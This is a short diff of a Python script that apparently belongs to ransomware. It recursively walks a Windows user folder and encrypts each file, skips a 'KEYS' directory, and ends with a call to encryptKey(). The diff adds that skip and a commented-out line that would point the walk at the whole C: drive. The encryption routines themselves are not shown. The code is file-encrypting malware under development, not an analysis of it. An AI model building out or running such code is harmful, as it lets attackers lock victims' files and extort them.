@@ -52,7 +52,10 @@ def dir(path):
 		lst = os.listdir(path)
 		for i in range(len(lst)):
 			lst[i] = path + "\\" + lst[i]
-			dir(lst[i])
+			if 'KEYS\\' not in lst[i]:
+				dir(lst[i])
+			else:
+				pass
 	except:
 		try:
 			status = encrypt(path)
@@ -96,4 +99,5 @@ def main():
 #	for drive in drives:
 #		dir(drive)
 	dir("C:\\Users\\Radhey\\OneDrive\\Desktop\\New folder")
+#	dir("C:")
 	encryptKey()
